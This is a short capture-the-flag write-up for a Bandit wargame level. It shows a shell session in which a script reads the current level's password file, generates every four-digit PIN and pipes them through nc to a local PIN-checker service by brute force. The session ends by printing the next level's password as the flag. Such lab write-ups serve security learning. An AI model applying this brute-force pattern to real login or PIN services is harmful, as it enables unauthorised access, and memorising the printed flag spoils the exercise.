# Bandit Level 25 Solution

```
bandit24@bandit:/tmp/tmp.qmmouBVoUs$ cat > script.sh
#!/bin/bash

old_pass=$(cat /etc/bandit_pass/bandit24)

for i in {0000..9999}; do
        echo "$old_pass $i" >> $(pwd)/input.txt
done
^C

bandit24@bandit:/tmp/tmp.qmmouBVoUs$ chmod +x script.sh
bandit24@bandit:/tmp/tmp.qmmouBVoUs$ ./script.sh
bandit24@bandit:/tmp/tmp.qmmouBVoUs$ cat $(pwd)/input.txt | nc localhost 30002 > $(pwd)/password
bandit24@bandit:/tmp/tmp.qmmouBVoUs$ ls -l password
-rw-rw-r-- 1 bandit24 bandit24 678908 Nov  1 12:19 password
bandit24@bandit:/tmp/tmp.qmmouBVoUs$ cat password | grep -v "Wr*"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

**Flag:** ***`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`*** 

